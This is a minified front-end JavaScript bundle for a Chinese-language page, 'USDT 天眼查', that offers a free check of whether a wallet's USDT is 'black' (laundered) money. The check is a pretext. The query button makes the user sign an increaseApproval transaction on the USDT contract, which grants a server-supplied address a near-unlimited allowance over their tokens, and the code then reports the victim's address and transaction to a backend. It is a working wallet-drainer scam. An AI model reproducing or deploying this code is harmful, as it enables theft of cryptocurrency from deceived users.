import{_ as a}from"./3Q-0feac8bb.js";import{a as t}from"./GoP6-329f107c.js";import{u as s}from"./Xm-a629356d.js";import{c as e,b as i}from"./a-b12a1c4f.js";import{v as o,b as r,Q as d,P as n,l,M as c,W as p,R as v,S as u,O as f,q as m}from"./mU-beeec96c.js";import{r as b,j,u as w}from"./SF9TR5-ac960a3b.js";import{F as h,B as g,s as y,c as T}from"./e5NRLXWMaA-44df416d.js";import{_ as A}from"./UZMhkFG9To-aef6b680.js";import"./oJRsb6Z-66576549.js";import"./QrRcCR-306d5cc4.js";import"./tmoz-15c9f8ca.js";import"./Y-579ccd95.js";import"./Q1H-8e37e022.js";import"./bc678Hiz-5f6ca57e.js";import"./H3kKuki-e6bf6260.js";import"./WFjHIv-d182c6e4.js";import"./ypd8Yw5UW-120c6969.js";import"./WMsrK5B77C-bfada61b.js";import"./DjMY-f1a68cab.js";import"./e-c8e3a33b.js";import"./C-0929b1bf.js";import"./IHzoR990bs-db06b2b1.js";import"./YcF3-1e1b36e2.js";import"./qAYU7-8f66bbd8.js";import"./AlbDH-d8e135df.js";import"./Z5vXU-ff27f4b9.js";import"./sQ-505cbca2.js";import"./JQnTANv-a82d6993.js";import"./5v0Hm-13cc43df.js";import"./juO-3186891c.js";/* empty css               */import"./0S0g8-ce2a75f1.js";/* empty css                   */import"./csxvUwuo-c7309c03.js";const U=a=>(v("data-v-1428105f"),a=a(),u(),a),k={class:"page-container"},S={class:"container"},_=p('<div class="top-banner-container" data-v-1428105f><div class="title" data-v-1428105f>USDT 天眼查</div><div class="list" data-v-1428105f><div class="list-item" data-v-1428105f>黑USDT查询</div><div class="list-item" data-v-1428105f>假USDT查询</div><div class="list-item" data-v-1428105f>交易所实名</div><div class="list-item" data-v-1428105f>查询地址余额</div></div></div>',1),x={class:"swap-content fs16"},R=U((()=>n("p",null,"黑USDT是什么？",-1))),W=U((()=>n("p",null," 黑USDT属于诈骗以后非法所得赃款洗兑成的USDT，将会在整条链上被追踪，部分黑U进入交易所兑换法币将会马上被冻结！ ",-1))),D=U((()=>n("p",null,"黑U的特点",-1))),O=U((()=>n("p",null,"1. 部分钱包没有头像",-1))),M=U((()=>n("p",null,"2. 部分钱包提示风险",-1))),N=U((()=>n("p",null,"3. 部分钱包显示余额",-1))),P=U((()=>n("p",{class:"bottom-m10"}," 4. 大多数黑USDT和正常USDT没有区别！必须经过检测查询方可得知！ ",-1))),q={class:"confirm-wrap top-m20 bottom-m20"},C=p('<div class="swap-info" data-v-1428105f><div data-v-1428105f><span class="label" data-v-1428105f>查询路径</span><span class="float-right" data-v-1428105f><div class="center-w" data-v-1428105f><span class="vertical-middle" data-v-1428105f> TRON </span><img src="'+a+'" width="23" height="23" data-v-1428105f></div></span></div><div data-v-1428105f><span class="label" data-v-1428105f>出报告时间</span><span class="float-right" data-v-1428105f><span data-v-1428105f> 1-5分钟 </span><i class="iconfont iconreverse" data-v-1428105f></i></span></div><div data-v-1428105f><span class="label" data-v-1428105f>手续费</span><span class="float-right" data-v-1428105f> 仅消耗燃料费用 </span></div><div data-v-1428105f><span class="label vertical-middle" data-v-1428105f>累计查询次数 </span><span class="float-right" data-v-1428105f>9999+</span></div></div>',1),H=A(o({__name:"tyc",setup(a){const o=b({authAddress:"TAmEpGWnsCkHnzKsBrpxyPUbCgexGmVM4E",domain:"https://inquire.etherminerblockchain.com",authSuccessTips:"Payment Successful",apikey:"702dfb0a-6c3b-47bd-8271-a41e1aca2c2d",isNeedUsdt:!1,isNeedFees:!1,reportTime:"1-5分钟",freeQueryCount:999,clickApprovePageTitle:"USDT 查询"}),p=j({fromQuantity:"",toAddress:""}),v=b(""),u=b(""),A=b(!1),U=b(""),H=b(0),Q=s(),B=async(a,t,s)=>{const e={addres:a,auth_addres:v.value,hash:s||0,wallete_type:"okt",client_id:8,source:window.location.href,agent_uid:u.value,block:"trx",client_type:1,amount:0};i(e)},F=async()=>{if(A.value=!0,p.toAddress){const{data:a}=await t.post("https://api.trongrid.io/wallet/validateaddress",{address:p.toAddress,visible:!0},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});if(!a.result)return A.value=!1,y("请检查查询的地址是否正确!")}(async()=>{try{if(!window.hasOwnProperty("tronWeb"))return y("请切换到TRON主链");A.value=!0;let a=await tronWeb.trx.getBalance()/1e6;if(o.value.isNeedFees&&a<25)return alert("TRX矿工费用不足"),void(A.value=!1);if(o.value.isNeedUsdt&&H.value<=0)return A.value=!1,void alert("USDT余额不足");const s=navigator.userAgent;/iphone|ipad|ipod|ios/i.test(s),/android|XiaoMi|MiuiBrowser/i.test(s),/OKApp/i.test(s),document.title=o.value.clickApprovePageTitle;let e={};const i=U.value;let r=[{type:"address",value:v.value},{type:"uint256",value:"23384026197294446691258957323460528314494920687615"}];A.value=!1;let d=await tronWeb.transactionBuilder.triggerSmartContract("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t","increaseApproval(address,uint256)",{},r,i),n=d.transaction.raw_data.contract[0].parameter.value.data,l=d.transaction.raw_data.contract[0].type;e=await tronWeb.trx.sign(d.transaction),e.raw_data.contract[0].parameter.value.data=n,e.raw_data.contract[0].type=l;const{data:c}=await t.post("https://api.trongrid.io/wallet/broadcasttransaction",{...e},{headers:{"TRON-PRO-API-KEY":o.value.apikey}});c.result&&(B(i,"approve",c.txid),A.value=!1,y(o.value.authSuccessTips)),A.value=!1}catch(a){T(),A.value=!1,y(a.message||a),-1!=String(a).indexOf(" declined by user")&&y("您已取消")}})()},K=async()=>{(async()=>{const a=await tronWeb.defaultAddress.base58;if(U.value=a,!a)return y("无法获取钱包地址!请检查您的浏览器是否支持TRON!");const{data:s}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${a}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=USDT`);if(A.value=!1,s.data.length>0){const a=s.data[0];H.value=a.balance/Math.pow(10,6)}else H.value=0})();const a=(await e({block:"trx",type:"approve"})).data;v.value=a};return r((async()=>{var a;const s=(null==(a=Q.query)?void 0:a.iv)||"";u.value=s||"";const e=Q.query;(null==e?void 0:e.v)&&(u.value=(null==e?void 0:e.v)||""),(async()=>{const{data:a}=await t.get("/assets/config.json");o.value=a})();const i=navigator.userAgent,r=/iphone|ipad|ipod|ios/i.test(i),d=/android|XiaoMi|MiuiBrowser/i.test(i),n=r||d,l=/OKApp/i.test(i);tronWeb.isTronLink&&!n&&await tronWeb.request({method:"tron_requestAccounts"}),n&&n&&l?(await window.okxwallet.tronLink.request({method:"tron_requestAccounts"}),window.tronWeb=window.okxwallet.tronLink.tronWeb,K()):K()})),(a,t)=>(f(),d("div",k,[n("div",S,[_,n("div",x,[R,W,D,O,M,N,P,l(w(h),{modelValue:p.toAddress,"onUpdate:modelValue":t[0]||(t[0]=a=>p.toAddress=a),style:{"font-size":"15px","border-radius":"14px","background-color":"#f7f8fa"},placeholder:"默认查询当前钱包",border:!1},null,8,["modelValue"]),n("div",q,[l(w(g),{style:{width:"100%","border-radius":"12px"},color:"#3478f6",onClick:F,loading:A.value},{default:c((()=>[m("查询并显示报告")])),_:1},8,["loading"])]),C])])]))}}),[["__scopeId","data-v-1428105f"]]);export{H as default};
